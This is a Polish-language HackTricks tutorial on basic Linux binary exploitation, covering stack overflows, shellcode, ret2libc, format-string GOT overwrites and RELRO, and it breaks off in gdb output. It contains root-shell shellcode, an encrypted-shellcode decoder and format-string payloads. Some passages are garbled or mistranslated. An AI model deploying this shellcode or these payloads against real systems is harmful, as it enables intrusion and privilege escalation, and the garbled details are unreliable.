# Eksploatacja systemu Linux (Podstawy) (SPA)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.

</details>

## **1. PRZEPEŁNIENIA STOSU**

> przepełnienie bufora, nadpisanie bufora, przepełnienie stosu, zgniatanie stosu

Segmentation fault lub naruszenie segmentu: Gdy próbuje się uzyskać dostęp do adresu pamięci, który nie został przydzielony procesowi.

Aby uzyskać adres funkcji wewnątrz programu, można użyć:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Wywołanie sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** —> Returns a .o file\
**ld assembly.o -o shellcodeout** —> Generates an executable with the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** —> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
Aby sprawdzić, czy wywołania systemowe są wykonywane poprawnie, należy skompilować poprzedni program, a wywołania systemowe powinny pojawić się w **strace ./SKOMPILOWANY\_PROGRAM**

Podczas tworzenia shellcode'u można zastosować sztuczkę. Pierwsza instrukcja to skok do wywołania. Wywołanie wykonuje oryginalny kod i dodatkowo umieszcza EIP na stosie. Po instrukcji call umieszczamy potrzebny nam ciąg znaków, dzięki czemu za pomocą tego EIP możemy wskazać na ciąg znaków i kontynuować wykonywanie kodu.

PRZYKŁAD **SZTUCZKI (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Użycie Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**Eksploracja podstawowa ESP:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Łowca jajek:**

Polega na małym kodzie, który przeszukuje strony pamięci powiązane z procesem w poszukiwaniu tam przechowywanej shellcode (szuka jakiegoś podpisu umieszczonego w shellcode). Przydatne w przypadkach, gdy jest tylko niewielka przestrzeń do wstrzyknięcia kodu.

**Shellkody polimorficzne**

Polegają na zaszyfrowanych shellach, które posiadają małe kody deszyfrujące i skaczące do nich, używając sztuczki Call-Pop, oto **przykład zaszyfrowanego szyfru Cezara**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **Atakowanie wskaźnika ramki (EBP)**

Przydatne w sytuacji, gdy możemy modyfikować EBP, ale nie EIP.

Wiadomo, że po opuszczeniu funkcji wykonany zostanie następujący kod assemblera:
```
movl               %ebp, %esp
popl                %ebp
ret
```
W ten sposób, jeśli można zmodyfikować EBP po wyjściu z funkcji (fvuln), która została wywołana przez inną funkcję, gdy funkcja wywołująca fvuln zakończy działanie, jej EIP może zostać zmieniony.

W fvuln można wprowadzić fałszywy EBP wskazujący na miejsce, gdzie znajduje się adres shellcode + 4 (należy dodać 4 ze względu na pop). W ten sposób po wyjściu z funkcji wartość &(\&Shellcode)+4 zostanie umieszczona w ESP, a pop zmniejszy ESP o 4, wskazując na adres shellcode podczas wykonywania ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + wypełnienie + &(\&Shellcode)+4

**Exploit Off-by-One**\
Pozwala na zmodyfikowanie tylko najmniej znaczącego bajtu EBP. Można przeprowadzić atak podobny do powyższego, ale pamięć przechowująca adres shellcode musi dzielić 3 pierwsze bajty z EBP.

## **4. Metody powrotu do Libc**

Metoda przydatna, gdy stos nie jest wykonywalny lub pozostawia zbyt mały bufor do modyfikacji.

ASLR powoduje, że funkcje są ładowane w różnych miejscach pamięci podczas każdego uruchomienia. Dlatego ta metoda może nie być skuteczna w tym przypadku. Dla zdalnych serwerów, ponieważ program jest ciągle wykonywany pod tym samym adresem, może być przydatna.

* **cdecl(C declaration)** Umieszcza argumenty na stosie i po wyjściu z funkcji czyści stos
* **stdcall(standard call)** Umieszcza argumenty na stosie i to funkcja wywołana czyści stos
* **fastcall** Umieszcza dwa pierwsze argumenty w rejestrach, a resztę na stosie

Wstawiamy adres instrukcji system z libc i przekazujemy jako argument string "/bin/sh", zazwyczaj z zmiennej środowiskowej. Ponadto używamy adresu funkcji exit, aby po zakończeniu użycia powłoki program zakończył działanie bez problemów (i zapisywał logi).

**export SHELL=/bin/sh**

Aby znaleźć potrzebne adresy, można sprawdzić w **GDB:**\
**p system**\
**p exit**\
**rabin2 -i executable** —> Daje adresy wszystkich funkcji używanych przez program podczas ładowania\
(Wewnątrz startu lub jakiegoś punktu przerwania): **x/500s $esp** —> Szukamy tutaj stringa /bin/sh

Po uzyskaniu tych adresów **exploit** będzie wyglądał następująco:

"A" \* ODLEGŁOŚĆ EBP + 4 (EBP: mogą być 4 "A", ale lepiej, jeśli to jest rzeczywisty EBP, aby uniknąć błędów segmentacji) + Adres **system** (nadpisze EIP) + Adres **exit** (po wyjściu z system(“/bin/sh”) ta funkcja zostanie wywołana, ponieważ pierwsze 4 bajty stosu są traktowane jako następny adres EIP do wykonania) + Adres “**/bin/sh**” (będzie to parametr przekazany do system)

W ten sposób EIP zostanie nadpisany adresem system, który otrzyma jako parametr string "/bin/sh", a po jego wykonaniu funkcja exit() zostanie uruchomiona.

Może się zdarzyć, że któryś bajt z adresu funkcji będzie nullem lub spacją (\x20). W takim przypadku można rozłożyć wcześniejsze adresy przed tą funkcją, ponieważ prawdopodobnie znajdują się tam kilka NOP-ów, które pozwolą nam wywołać któryś z nich zamiast funkcji bezpośrednio (na przykład za pomocą > x/8i system-4).

Ta metoda działa, ponieważ wywołując funkcję jak system za pomocą opcode'u **ret** zamiast **call**, funkcja rozumie, że pierwsze 4 bajty będą adresem **EIP**, do którego ma wrócić.

Interesującą techniką z tą metodą jest wywołanie **strncpy()** do przeniesienia ładunku ze stosu do sterty, a następnie użycie **gets()** do wykonania tego ładunku.

Inną interesującą techniką jest użycie **mprotect()**, która pozwala przypisać pożądane uprawnienia do dowolnej części pamięci. Działała lub działała w BDS, MacOS i OpenBSD, ale nie w linuxie (kontroluje, czy nie można jednocześnie przyznać uprawnień do zapisu i wykonania). Za pomocą tego ataku można ponownie skonfigurować stos jako wykonywalny.

**Łączenie funkcji**

Opierając się na powyższej technice, ten sposób exploitacji polega na:\
Wypełnienie + \&Funkcja1 + \&pop;ret; + \&arg\_fun1 + \&Funkcja2 + \&pop;ret; + \&arg\_fun2 + …

W ten sposób można łączyć funkcje do wywołania. Ponadto, jeśli chcemy użyć funkcji z kilkoma argumentami, możemy umieścić potrzebne argumenty (np. 4) i umieścić 4 argumenty oraz znaleźć adres do miejsca z opcode'ami: pop, pop, pop, pop, ret —> **objdump -d executable**

**Łączenie poprzez fałszowanie ramek (łączenie EBPs)**

Polega na wykorzystaniu możliwości manipulowania EBP do łączenia wykonania kilku funkcji poprzez EBP i "leave;ret"

RELLENO

* Umieszczamy w EBP fałszywy EBP wskazujący na: 2. fałszywy EBP + funkcję do wykonania: (\&system() + \&leave;ret + &“/bin/sh”)
* W EIP umieszczamy jako adres funkcji &(leave;ret)

Rozpoczynamy shellcode od adresu kolejnej części shellcode, na przykład: 2. fałszywy EBP + \&system() + &(leave;ret;) + &”/bin/sh”

2. EBP byłoby: 3. fałszywy EBP + \&system() + &(leave;ret;) + &”/bin/ls”

Ta shellcode może być powtarzana w nieskończoność w dostępnych częściach pamięci, dzięki czemu łatwo podzielić ją na małe fragmenty pamięci.

(Wykorzystuje się łączenie wykonania funkcji poprzez wcześniej omówione podatności EBP i ret2lib)

## **5. Metody uzupełniające**

**Ret2Ret**

Przydatne, gdy nie można umieścić adresu stosu w EIP (sprawdzane jest, czy EIP nie zawiera 0xbf) lub gdy nie można obliczyć lokalizacji shellcode. Jednak funkcja podatna akceptuje parametr (tutaj trzeba umieścić shellcode).

W ten sposób, zmieniając EIP na adres **ret**, zostanie załadowany następny adres (który jest adresem pierwszego argumentu funkcji). Innymi słowy, zostanie załadowana shellcode.

Exploit będzie wyglądał: SHELLCODE + Wypełnienie (do EIP) + **\&ret** (następne bajty stosu wskazują na początek shellcode, ponieważ na stosie umieszczony jest adres przekazanego parametru)

Wygląda na to, że funkcje takie jak **strncpy** po zakończeniu usuwają z stosu adres, w którym przechowywana była shellcode, uniemożliwiając tę technikę. Innymi słowy, adres przekazywany funkcji jako argument (ten, który przechowuje shellcode) jest modyfikowany na 0x00, więc po wywołaniu drugiego **ret** program napotyka na 0x00 i kończy działanie.
```
**Ret2PopRet**
```
**Technika Murata**

W systemie Linux wszystkie programy są mapowane zaczynając od 0xbfffffff.

Analizując jak jest budowany stos nowego procesu w systemie Linux, można opracować exploit w taki sposób, że program zostanie uruchomiony w środowisku, w którym jedyną zmienną jest shellcode. Adres tej zmiennej można obliczyć jako: addr = 0xbfffffff - 4 - strlen(NAZWA\_PEŁNEJ\_ŚCIEŻKI\_DO\_PLIKU\_WYKONAWCZEGO) - strlen(shellcode)

W ten sposób można łatwo uzyskać adres zmiennej środowiskowej zawierającej shellcode.

Można to zrobić dzięki funkcji execle, która pozwala tworzyć środowisko zawierające tylko wybrane zmienne środowiskowe.

**Skok do ESP: Styl Windows**

Ponieważ ESP zawsze wskazuje na początek stosu, ta technika polega na zastąpieniu EIP adresem wywołania **jmp esp** lub **call esp**. W ten sposób shellcode jest zapisywany po nadpisaniu EIP, ponieważ po wykonaniu instrukcji **ret** ESP wskazuje na następny adres, dokładnie tam, gdzie zapisano shellcode.

W przypadku braku aktywnego ASLR w systemie Windows lub Linux, można wywołać **jmp esp** lub **call esp** przechowywane w jakimś obiekcie współdzielonym. Jeśli ASLR jest aktywny, można poszukać ich w samym programie podatnym na atak.

Ponadto, umożliwienie umieszczenia shellcode po nadpisaniu EIP zamiast w środku stosu pozwala uniknąć dotknięcia jej instrukcjami push lub pop wykonywanymi w trakcie funkcji (co mogłoby się zdarzyć, gdyby była umieszczona w środku stosu funkcji).

Podobnie, jeśli wiadomo, że funkcja zwraca adres, pod którym znajduje się shellcode, można wywołać **call eax** lub **jmp eax (ret2eax).**

**Przepełnienia liczb całkowitych**

Ten rodzaj przepełnień występuje, gdy zmienna nie jest przygotowana na obsługę tak dużej liczby, jaką się jej przekazuje, być może z powodu pomyłki między zmiennymi ze znakiem i bez znaku, na przykład:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
W powyższym przykładzie widzimy, że program oczekuje 2 parametrów. Pierwszy to długość następnego ciągu znaków, a drugi to ciąg znaków.

Jeśli podamy jako pierwszy parametr liczbę ujemną, program wyświetli, że len < 256 i przejdziemy przez ten filtr, a ponadto strlen(buffer) będzie mniejsze niż l, ponieważ l jest typu unsigned int i będzie bardzo duże.

Ten rodzaj przepełnień nie ma na celu zapisania czegoś w procesie programu, ale przejście przez źle zaprojektowane filtry w celu wykorzystania innych podatności.

**Zmienne niezainicjowane**

Nie wiadomo, jaką wartość może przyjąć zmienna niezainicjowana, dlatego warto to obserwować. Może się zdarzyć, że przyjmie wartość zmiennej z poprzedniej funkcji, która jest kontrolowana przez atakującego.

## **Format Strings**

W języku C **`printf`** to funkcja, która może być używana do **wyświetlania** pewnego ciągu znaków. **Pierwszym parametrem**, którego ta funkcja oczekuje, jest **surowy tekst z formatami**. **Następne parametry** oczekiwane są jako **wartości**, które mają **zastąpić formatery** w surowym tekście.

Podatność pojawia się, gdy **tekst atakującego jest umieszczany jako pierwszy argument** tej funkcji. Atakujący będzie mógł stworzyć **specjalne dane wykorzystując** możliwości **formatowania printf**, aby **zapisać dowolne dane pod dowolnym adresem**. Dzięki temu będzie mógł **wykonać dowolny kod**.

Formatery:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`** **zapisuje** liczbę **napisanych bajtów** pod wskazanym adresem. Zapisując **tyle bajtów**, ile wynosi liczba szesnastkowa, którą **chcemy zapisać**, możemy **zapisać dowolne dane**.
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

To jest tabela zawierająca **adresy** do **funkcji zewnętrznych** używanych przez program.

Pobierz adres tej tabeli za pomocą: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Zauważ, jak po **załadowaniu** pliku wykonywalnego w GEF możesz **zobaczyć** **funkcje**, które znajdują się w **GOT**: `gef➤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Korzystając z GEF, możesz **rozpocząć** sesję **debugowania** i wykonać **`got`**, aby zobaczyć tabelę got:

![](<../../.gitbook/assets/image (621).png>)

W pliku binarnym GOT zawiera **adresy funkcji lub** sekcji **PLT**, która załaduje adres funkcji. Celem tego exploitu jest **nadpisanie wpisu GOT** funkcji, która zostanie wykonana później **adresem** PLT funkcji **`system`**. Idealnie, nadpiszesz **GOT** funkcji, która **zostanie wywołana z kontrolowanymi przez ciebie parametrami** (dzięki czemu będziesz mógł kontrolować parametry przesyłane do funkcji system).

Jeśli **`system`** **nie jest używany** przez skrypt, funkcja systemowa **nie** będzie miała wpisu w GOT. W takim scenariuszu będziesz **musiał najpierw ujawnić adres** funkcji `system`.

**Procedure Linkage Table** to tabela **tylko do odczytu** w pliku ELF, która przechowuje wszystkie niezbędne **symbole wymagające rozwiązania**. Gdy jedna z tych funkcji zostanie wywołana, **GOT** przekieruje **przepływ** do **PLT**, aby móc **rozwiązać** **adres** funkcji i zapisać go w GOT.\
Następnie, **przy następnym** wywołaniu tego adresu **funkcja** jest **wywoływana bezpośrednio** bez konieczności jej rozwiązywania.

Możesz zobaczyć adresy PLT za pomocą **`objdump -j .plt -d ./vuln_binary`**

### **Przepływ exploitacji**

Jak wyjaśniono wcześniej, celem będzie **nadpisanie adresu** funkcji w tabeli **GOT**, która zostanie wywołana później. Idealnie moglibyśmy ustawić **adres do shellcode'u** znajdującego się w sekcji wykonywalnej, ale jest bardzo prawdopodobne, że nie będziesz mógł napisać shellcode'u w sekcji wykonywalnej.\
Dlatego inną opcją jest **nadpisanie funkcji**, która **otrzymuje** swoje **argumenty** od **użytkownika** i **skierowanie** jej do funkcji **`system`**.

Aby zapisać adres, zazwyczaj wykonuje się 2 kroki: **najpierw zapisujesz 2 bajty** adresu, a następnie pozostałe 2. Do tego używa się **`$hn`**.

**HOB** oznacza 2 najstarsze bajty adresu\
**LOB** oznacza 2 najmłodsze bajty adresu

Zatem, ze względu na sposób działania formatu łańcuchów, musisz **najpierw zapisać mniejszy** z \[HOB, LOB], a następnie drugi.

Jeśli HOB < LOB\
`[adres+2][adres]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Jeśli HOB > LOB\
`[adres+2][adres]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NºParam\_dir\_HOB LOB\_shell-HOB\_shell NºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Szablon exploitacji formatu łańcuchów**

Możesz znaleźć **szablon** do eksploitacji GOT za pomocą łańcuchów formatujących tutaj:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

W zasadzie jest to struktura z **funkcjami, które zostaną wywołane** przed zakończeniem programu. Jest to interesujące, jeśli możesz wywołać swój **shellcode, skacząc do adresu**, lub w przypadkach, gdy musisz wrócić ponownie do głównego, aby **ponownie wykorzystać format łańcucha**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Zauważ, że to **nie** spowoduje **wiecznej pętli**, ponieważ gdy wrócisz do głównej funkcji, canary zauważy, że koniec stosu może być uszkodzony i funkcja nie zostanie ponownie wywołana. Dzięki temu będziesz mógł **wykonać 1 dodatkowe** wywołanie podatności.

### **Formatowanie łańcucha do wycieku zawartości**

Łańcuch formatujący może również być nadużyty do **wycieku zawartości** z pamięci programu.\
Na przykład, w następującej sytuacji istnieje **zmienna lokalna na stosie wskazująca na flagę**. Jeśli **znajdziesz**, gdzie w **pamięci** jest **wskaźnik** do **flagi**, możesz sprawić, że **printf** uzyska dostęp do tego **adresu** i **wyświetli** flagę:

Więc flaga jest pod adresem **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

A z wycieku możesz zobaczyć, że **wskaźnik do flagi** jest w **8. parametrze**:

![](<../../.gitbook/assets/image (623).png>)

Więc, **uzyskując dostęp** do **8. parametru**, możesz uzyskać flagę:

![](<../../.gitbook/assets/image (624).png>)

Zauważ, że po **poprzednim ataku** i zrozumieniu, że możesz **wyciekać zawartość**, możesz **ustawić wskaźniki** na **`printf`** w sekcji, gdzie jest **załadowany** **plik wykonywalny** i **wyciekać** go **całkowicie**!

### **DTOR**

{% hint style="danger" %}
Obecnie jest bardzo **dziwne znalezienie binarnego pliku z sekcją dtor**.
{% endhint %}

Destruktory to funkcje, które są **wykonywane przed zakończeniem programu**.\
Jeśli uda ci się **zapisać** adres **shellcode** w **`__DTOR_END__`**, to zostanie **wykonany** przed zakończeniem programu.\
Uzyskaj adres tej sekcji za pomocą:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
Zazwyczaj znajdziesz sekcję **DTOR** **pomiędzy** wartościami `ffffffff` i `00000000`. Jeśli widzisz tylko te wartości, oznacza to, że **nie ma zarejestrowanej żadnej funkcji**. Nadpisz wartość **`00000000`** adresem **shellcode'u**, aby go wykonać.

### **Formatowanie łańcuchów do przepełnień bufora**

Funkcja **sprintf** przenosi sformatowany łańcuch **do** zmiennej. Dlatego można nadużyć **formatowania** łańcucha, aby spowodować **przepełnienie bufora w zmiennej**, do której jest kopiowana zawartość.\
Na przykład ładunek `%.44xAAAA` zapisze 44B+"AAAA" w zmiennej, co może spowodować przepełnienie bufora.

### **Struktury \_\_atexit**

{% hint style="danger" %}
Obecnie jest bardzo **dziwne, aby to wykorzystać**.
{% endhint %}

**`atexit()`** to funkcja, do której **przekazywane są inne funkcje jako parametry**. Te **funkcje** zostaną **wykonane** podczas wykonywania **`exit()`** lub **powrotu** do **main**.\
Jeśli można **zmodyfikować adres** dowolnej z tych **funkcji**, aby wskazywał na shellcode na przykład, uzyskasz **kontrolę** nad **procesem**, ale obecnie jest to bardziej skomplikowane.\
Obecnie **adresy funkcji** do wykonania są **ukryte** za kilkoma strukturami, a ostatecznie adres, na który wskazują, nie są adresami funkcji, lecz są **zaszyfrowane za pomocą operacji XOR** i przesunięć z **losowym kluczem**. Dlatego obecnie ten wektor ataku **nie jest bardzo przydatny przynajmniej na x86** i **x64\_86**.\
Funkcja **szyfrowania** to **`PTR_MANGLE`**. **Inne architektury** takie jak m68k, mips32, mips64, aarch64, arm, hppa... **nie implementują funkcji szyfrowania**, ponieważ **zwracają to samo**, co otrzymały jako dane wejściowe. Dlatego te architektury mogą być podatne na ten wektor ataku.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Obecnie jest bardzo **dziwne, aby to wykorzystać**.
{% endhint %}

**`Setjmp()`** pozwala **zapisać** kontekst (rejestry)\
**`longjmp()`** pozwala **przywrócić** kontekst.\
Zapisane rejestry to: `EBX, ESI, EDI, ESP, EIP, EBP`\
To, co się dzieje, to że EIP i ESP są przekazywane przez funkcję **`PTR_MANGLE`**, więc **architektura podatna na ten atak jest taka sama jak powyżej**.\
Są one przydatne do odzyskiwania błędów lub przerwań.\
Jednak z tego, co przeczytałem, inne rejestry nie są chronione, **więc jeśli wewnątrz wywoływanej funkcji jest `call ebx`, `call esi` lub `call edi`**, kontrolę można przejąć. Lub można również zmodyfikować EBP, aby zmodyfikować ESP.

**VTable i VPTR w C++**

Każda klasa ma **Vtable**, która jest tablicą **wskaźników do metod**.

Każdy obiekt **klasy** ma **VPtr**, który jest **wskaźnikiem** do tablicy swojej klasy. VPtr jest częścią nagłówka każdego obiektu, więc jeśli osiągnięto **nadpisanie** VPtr, można je **zmodyfikować**, aby wskazywało na metodę zastępczą, dzięki czemu wykonanie funkcji przejdzie do shellcode'u.

## **Zapobieganie i unikanie**

**Return-into-printf**

To technika zamiany przepełnienia bufora na błąd formatu łańcucha. Polega na zmianie EIP, aby wskazywał na printf funkcji i przekazaniu mu sformatowanego łańcucha, aby uzyskać informacje o stanie procesu.

**Atak na biblioteki**

Biblioteki mają pozycję z 16-bitową losowością = 65636 możliwych adresów. Jeśli serwer podatny wywołuje fork(), przestrzeń adresowa pamięci jest klonowana w procesie potomnym i pozostaje nietknięta. Dlatego można spróbować przeprowadzić atak siłowy na funkcję usleep() z libc, przekazując jej argument "16", aby gdy odpowiedź zajmie dłużej niż zwykle, funkcja zostanie znaleziona. Znając lokalizację tej funkcji, można uzyskać delta\_mmap i obliczyć pozostałe.

Jedynym sposobem, aby mieć pewność, że ASLR działa, jest korzystanie z architektury 64-bitowej. Tam nie ma ataków siłowych.

### Relro

**Relro (Read only Relocation)** wpływa na uprawnienia pamięci podobnie jak NX. Różnica polega na tym, że podczas gdy NX sprawia, że stos jest wykonywalny, RELRO sprawia, że **pewne rzeczy są tylko do odczytu**, więc **nie możemy zapisywać** do nich. Najczęstszą przeszkodą, jaką widziałem, jest uniemożliwienie nam wykonania **nadpisania tabeli `got`**, o czym będzie mowa później. Tabela `got` przechowuje adresy funkcji libc, dzięki czemu binarny plik wie, jakie są adresy i może je wywołać. Zobaczmy, jak wyglądają uprawnienia pamięci dla wpisu tabeli `got` dla binarnego pliku z i bez relro.

Z relro:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Bez relro:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
